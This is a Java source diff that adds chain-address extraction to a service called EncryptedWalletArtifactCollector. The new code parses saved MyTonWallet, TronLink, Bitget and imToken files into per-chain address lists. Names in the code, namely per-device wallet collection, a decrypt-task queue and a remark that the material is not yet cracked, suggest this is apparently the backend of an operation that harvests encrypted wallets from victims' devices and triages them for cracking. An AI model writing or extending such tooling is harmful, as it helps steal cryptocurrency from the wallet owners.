@@ -1,11 +1,13 @@
 package com.consumer.service;
 
 import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.JSONArray;
 import com.alibaba.fastjson.JSONObject;
 import com.alibaba.fastjson.serializer.SerializerFeature;
 import com.consumer.config.ConsumerProperties;
 import com.consumer.dao.DecryptTaskDao;
 import com.consumer.entity.DecryptTaskEntity;
+import com.consumer.util.BIP32Util;
 
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.stereotype.Service;
@@ -52,6 +54,19 @@ public class EncryptedWalletArtifactCollector {
     private static final Pattern B64_LINE = Pattern.compile("^[A-Za-z0-9+/=\\r\\n]+$");
     private static final Pattern UUID_TEXT = Pattern.compile(
             "^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$");
+    private static final Pattern EVM_ADDR = Pattern.compile("0x[a-fA-F0-9]{40}\\b");
+    private static final Pattern TRON_ADDR = Pattern.compile("T[1-9A-HJ-NP-Za-km-z]{33}");
+    private static final Pattern TON_ADDR = Pattern.compile("[UE][Qq][A-Za-z0-9_-]{46}");
+    private static final Pattern BTC_ADDR = Pattern.compile("(?:bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}\\b");
+
+    /** 常见代币合约，generic 扫描时排除 */
+    private static final Set<String> EVM_CONTRACT_DENY = new HashSet<>(Arrays.asList(
+            "0x0000000000000000000000000000000000000000",
+            "0xdac17f958d2ee523a2206206994597c13d831ec7",
+            "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
+            "0x55d398326f99059ff775485246999027b3197955",
+            "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d"
+    ));
 
     /**
      * 材料种类（内部用，用于优先级/文件名；入库的 encrypt_type 是算法名）。
@@ -210,6 +225,11 @@ public class EncryptedWalletArtifactCollector {
                     continue;
                 }
                 walletsTouched++;
+                try {
+                    writeChainAddressesSidecar(walletDir, walletName, list, now);
+                } catch (Throwable t) {
+                    log.debug("【waitbound】chain_addresses 跳过 wallet={} err={}", walletName, t.toString());
+                }
                 String dirStr = walletDir.toAbsolutePath().normalize().toString().replace('\\', '/');
 
                 Integer exist = decryptTaskDao.findIdByDeviceWallet(
@@ -617,6 +637,387 @@ public class EncryptedWalletArtifactCollector {
     private static void writeJson(Path path, Map<String, Object> obj) throws IOException {
         Files.write(path, JSON.toJSONString(obj, SerializerFeature.PrettyFormat)
                 .getBytes(StandardCharsets.UTF_8));
+    }
+
+    /**
+     * 从已落盘材料中提取可见链地址；仅当提取到至少一条地址时写入 {@code chain_addresses.json}。
+     */
+    void writeChainAddressesSidecar(Path walletDir, String walletName, List<Artifact> artifacts, double nowSec)
+            throws IOException {
+        if (walletDir == null || artifacts == null || artifacts.isEmpty()) {
+            return;
+        }
+        ChainAddressAccumulator acc = new ChainAddressAccumulator();
+        for (Artifact a : artifacts) {
+            if (a == null || a.contentBytes == null || a.contentBytes.length == 0) {
+                continue;
+            }
+            String sourceLabel = a.artifactKind == null ? "artifact" : a.artifactKind;
+            extractAddressesFromArtifact(walletName, a, sourceLabel, acc);
+        }
+        if (acc.isEmpty()) {
+            return;
+        }
+        Map<String, Object> root = new LinkedHashMap<>();
+        root.put("wallet", walletName);
+        root.put("note", "从落盘加密材料中提取的链地址，仅供人工核对；未破解前可能不完整");
+        root.put("updated_at_sec", nowSec);
+        root.put("chains", acc.toChainsMap());
+        root.put("sources", acc.sources);
+        Path out = walletDir.resolve("chain_addresses.json");
+        writeJson(out, root);
+    }
+
+    private static void extractAddressesFromArtifact(String walletName, Artifact a, String sourceLabel,
+                                                     ChainAddressAccumulator acc) {
+        String kind = a.artifactKind == null ? "" : a.artifactKind.toLowerCase(Locale.ROOT);
+        String text = tryUtf8Text(a.contentBytes);
+        if (text != null) {
+            String trimmed = text.trim();
+            if (trimmed.startsWith("{") || trimmed.startsWith("[")) {
+                try {
+                    Object parsed = JSON.parse(trimmed);
+                    if ("mytonwallet_accounts".equals(kind)) {
+                        extractMyTonWalletAccounts(parsed, sourceLabel, acc);
+                    } else if ("tronlink_keystore".equals(kind)) {
+                        extractTronlinkKeystore(parsed, sourceLabel, acc);
+                    } else if ("bitget_config_wallet".equals(kind)) {
+                        extractBitgetConfigWallet(parsed, sourceLabel, acc);
+                    } else if ("imtoken_als".equals(kind)) {
+                        extractImtokenAls(parsed, sourceLabel, acc);
+                    } else {
+                        extractAddressesFromJsonTree(parsed, sourceLabel, acc, false);
+                    }
+                    return;
+                } catch (Exception ignore) {
+                    // fall through to text scan
+                }
+            }
+            if ("imtoken_als".equals(kind)) {
+                scanTextForNamedHints(trimmed, sourceLabel, acc);
+            }
+        }
+        // 二进制 plist / blob：仅扫可打印串里的 TRON/EVM（保守）
+        if (text == null && a.contentBytes.length <= 256 * 1024) {
+            for (String s : extractAsciiStrings(a.contentBytes, 20, 200)) {
+                classifyAndAdd(s, null, sourceLabel, acc, false);
+            }
+        }
+    }
+
+    private static void extractMyTonWalletAccounts(Object parsed, String source, ChainAddressAccumulator acc) {
+        if (!(parsed instanceof JSONObject)) {
+            return;
+        }
+        JSONObject root = (JSONObject) parsed;
+        for (String accountKey : root.keySet()) {
+            Object accountObj = root.get(accountKey);
+            if (!(accountObj instanceof JSONObject)) {
+                continue;
+            }
+            JSONObject byChain = ((JSONObject) accountObj).getJSONObject("byChain");
+            if (byChain == null) {
+                continue;
+            }
+            for (String chainKey : byChain.keySet()) {
+                Object chainObj = byChain.get(chainKey);
+                if (!(chainObj instanceof JSONObject)) {
+                    continue;
+                }
+                String addr = ((JSONObject) chainObj).getString("address");
+                if (addr == null || addr.isEmpty()) {
+                    continue;
+                }
+                String chain = normalizeChainName(chainKey);
+                if (chain != null) {
+                    acc.add(chain, addr.trim(), source);
+                }
+            }
+        }
+    }
+
+    private static void extractTronlinkKeystore(Object parsed, String source, ChainAddressAccumulator acc) {
+        if (!(parsed instanceof JSONObject)) {
+            return;
+        }
+        String hex = ((JSONObject) parsed).getString("address");
+        if (hex == null || hex.isEmpty()) {
+            return;
+        }
+        String tron = tronHexToBase58(hex);
+        if (tron != null) {
+            acc.add("tron", tron, source);
+        }
+    }
+
+    private static void extractBitgetConfigWallet(Object parsed, String source, ChainAddressAccumulator acc) {
+        if (!(parsed instanceof JSONObject)) {
+            return;
+        }
+        JSONObject preview = ((JSONObject) parsed).getJSONObject("previewData");
+        if (preview == null) {
+            return;
+        }
+        JSONArray data = preview.getJSONArray("data");
+        if (data == null) {
+            return;
+        }
+        for (int i = 0; i < data.size(); i++) {
+            Object row = data.get(i);
+            if (!(row instanceof JSONObject)) {
+                continue;
+            }
+            JSONObject jo = (JSONObject) row;
+            String addr = jo.getString("address");
+            if (addr == null || addr.isEmpty() || "0x".equalsIgnoreCase(addr.trim())) {
+                continue;
+            }
+            String chain = normalizeChainName(jo.getString("chain"));
+            if (chain == null) {
+                chain = normalizeChainName(jo.getString("symbol"));
+            }
+            if (chain != null) {
+                acc.add(chain, addr.trim(), source);
+            }
+        }
+    }
+
+    private static void extractImtokenAls(Object parsed, String source, ChainAddressAccumulator acc) {
+        if (!(parsed instanceof JSONObject)) {
+            return;
+        }
+        JSONObject jo = (JSONObject) parsed;
+        String fp = jo.getString("sourceFingerprint");
+        if (fp != null && !fp.isEmpty()) {
+            classifyAndAdd(fp.trim(), "eth", source, acc, false);
+        }
+        extractAddressesFromJsonTree(jo, source, acc, true);
+    }
+
+    /** 递归 JSON：只认 address / sourceFingerprint 等字段，避免把 contract 当钱包地址 */
+    private static void extractAddressesFromJsonTree(Object node, String source, ChainAddressAccumulator acc,
+                                                     boolean imtokenMode) {
+        if (node instanceof JSONObject) {
+            JSONObject jo = (JSONObject) node;
+            for (String key : jo.keySet()) {
+                String lk = key.toLowerCase(Locale.ROOT);
+                Object val = jo.get(key);
+                if (val instanceof String) {
+                    String s = ((String) val).trim();
+                    if (s.isEmpty()) {
+                        continue;
+                    }
+                    if ("address".equals(lk)) {
+                        String chainHint = imtokenMode ? null : normalizeChainName(jo.getString("chain"));
+                        classifyAndAdd(s, chainHint, source, acc, false);
+                    } else if ("sourcefingerprint".equals(lk)) {
+                        classifyAndAdd(s, "eth", source, acc, false);
+                    } else if ("contract".equals(lk) || lk.endsWith("contract")) {
+                        // skip token contracts
+                    } else if (lk.contains("address") && !lk.contains("contract")) {
+                        classifyAndAdd(s, null, source, acc, false);
+                    }
+                } else if (val instanceof JSONObject || val instanceof JSONArray) {
+                    extractAddressesFromJsonTree(val, source, acc, imtokenMode);
+                }
+            }
+        } else if (node instanceof JSONArray) {
+            JSONArray arr = (JSONArray) node;
+            for (int i = 0; i < arr.size(); i++) {
+                extractAddressesFromJsonTree(arr.get(i), source, acc, imtokenMode);
+            }
+        }
+    }
+
+    private static void scanTextForNamedHints(String text, String source, ChainAddressAccumulator acc) {
+        for (String line : text.split("\\R")) {
+            String t = line.trim();
+            if (t.contains("sourceFingerprint") || t.contains("address")) {
+                for (String evm : collectMatches(EVM_ADDR, t)) {
+                    classifyAndAdd(evm, "eth", source, acc, true);
+                }
+            }
+        }
+    }
+
+    private static void classifyAndAdd(String raw, String chainHint, String source, ChainAddressAccumulator acc,
+                                       boolean allowGenericEvm) {
+        if (raw == null) {
+            return;
+        }
+        String s = raw.trim();
+        if (s.isEmpty()) {
+            return;
+        }
+        if (chainHint != null) {
+            String chain = normalizeChainName(chainHint);
+            if (chain != null && looksLikeAddressForChain(chain, s)) {
+                acc.add(chain, normalizeAddress(chain, s), source);
+            }
+            return;
+        }
+        if (TRON_ADDR.matcher(s).matches()) {
+            acc.add("tron", s, source);
+            return;
+        }
+        if (TON_ADDR.matcher(s).matches()) {
+            acc.add("ton", s, source);
+            return;
+        }
+        if (BTC_ADDR.matcher(s).matches()) {
+            acc.add("btc", s, source);
+            return;
+        }
+        if (s.startsWith("0x") && s.length() == 42 && EVM_ADDR.matcher(s).matches()) {
+            if (!allowGenericEvm && EVM_CONTRACT_DENY.contains(s.toLowerCase(Locale.ROOT))) {
+                return;
+            }
+            acc.add("eth", s, source);
+            return;
+        }
+        if (s.length() == 42 && s.toLowerCase(Locale.ROOT).startsWith("41")) {
+            String tron = tronHexToBase58(s);
+            if (tron != null) {
+                acc.add("tron", tron, source);
+            }
+        }
+    }
+
+    private static boolean looksLikeAddressForChain(String chain, String addr) {
+        switch (chain) {
+            case "eth":
+            case "bsc":
+                return addr.startsWith("0x") && addr.length() == 42;
+            case "btc":
+                return BTC_ADDR.matcher(addr).matches();
+            case "tron":
+                return TRON_ADDR.matcher(addr).matches() || addr.toLowerCase(Locale.ROOT).startsWith("41");
+            case "ton":
+                return TON_ADDR.matcher(addr).matches();
+            case "sol":
+                return addr.length() >= 32 && addr.length() <= 44 && !addr.startsWith("0x");
+            default:
+                return !addr.isEmpty();
+        }
+    }
+
+    private static String normalizeAddress(String chain, String addr) {
+        if ("eth".equals(chain) || "bsc".equals(chain)) {
+            return addr.startsWith("0x") ? addr : "0x" + addr;
+        }
+        return addr;
+    }
+
+    private static String normalizeChainName(String raw) {
+        if (raw == null || raw.isEmpty()) {
+            return null;
+        }
+        String c = raw.trim().toLowerCase(Locale.ROOT);
+        switch (c) {
+            case "eth":
+            case "ethereum":
+                return "eth";
+            case "bsc":
+            case "bnb":
+            case "binance":
+                return "bsc";
+            case "btc":
+            case "bitcoin":
+                return "btc";
+            case "tron":
+            case "trx":
+                return "tron";
+            case "sol":
+            case "solana":
+                return "sol";
+            case "ton":
+                return "ton";
+            default:
+                if (c.length() <= 12 && c.matches("[a-z0-9_]+")) {
+                    return c;
+                }
+                return null;
+        }
+    }
+
+    private static String tronHexToBase58(String hex) {
+        if (hex == null) {
+            return null;
+        }
+        String h = hex.trim();
+        if (h.startsWith("0x") || h.startsWith("0X")) {
+            h = h.substring(2);
+        }
+        if (h.length() == 40) {
+            h = "41" + h;
+        }
+        if (h.length() != 42 || !h.regionMatches(true, 0, "41", 0, 2)) {
+            return null;
+        }
+        try {
+            byte[] payload = parseHexBytes(h);
+            if (payload.length != 21 || payload[0] != 0x41) {
+                return null;
+            }
+            byte[] addr20 = Arrays.copyOfRange(payload, 1, 21);
+            return BIP32Util.base58CheckEncode(new byte[]{0x41}, addr20);
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
+    private static byte[] parseHexBytes(String hex) {
+        if (hex == null || (hex.length() & 1) == 1) {
+            throw new IllegalArgumentException("bad hex");
+        }
+        byte[] out = new byte[hex.length() / 2];
+        for (int i = 0; i < out.length; i++) {
+            int hi = Character.digit(hex.charAt(i * 2), 16);
+            int lo = Character.digit(hex.charAt(i * 2 + 1), 16);
+            if (hi < 0 || lo < 0) {
+                throw new IllegalArgumentException("bad hex");
+            }
+            out[i] = (byte) ((hi << 4) | lo);
+        }
+        return out;
+    }
+
+    private static List<String> collectMatches(Pattern p, String text) {
+        List<String> list = new ArrayList<>();
+        java.util.regex.Matcher m = p.matcher(text);
+        while (m.find()) {
+            list.add(m.group());
+        }
+        return list;
+    }
+
+    private static final class ChainAddressAccumulator {
+        final Map<String, LinkedHashSet<String>> byChain = new LinkedHashMap<>();
+        final List<Map<String, String>> sources = new ArrayList<>();
+
+        void add(String chain, String address, String sourceKind) {
+            if (chain == null || address == null || address.isEmpty()) {
+                return;
+            }
+            byChain.computeIfAbsent(chain, k -> new LinkedHashSet<>()).add(address);
+            Map<String, String> src = new LinkedHashMap<>();
+            src.put("artifact_kind", sourceKind);
+            src.put("chain", chain);
+            src.put("address", address);
+            sources.add(src);
+        }
+
+        Map<String, List<String>> toChainsMap() {
+            Map<String, List<String>> out = new LinkedHashMap<>();
+            for (Map.Entry<String, LinkedHashSet<String>> e : byChain.entrySet()) {
+                out.put(e.getKey(), new ArrayList<>(e.getValue()));
+            }
+            return out;
+        }
+
+        boolean isEmpty() {
+            return byChain.isEmpty();
+        }
     }
 
     private static boolean startsWithAscii(byte[] data, String s) {
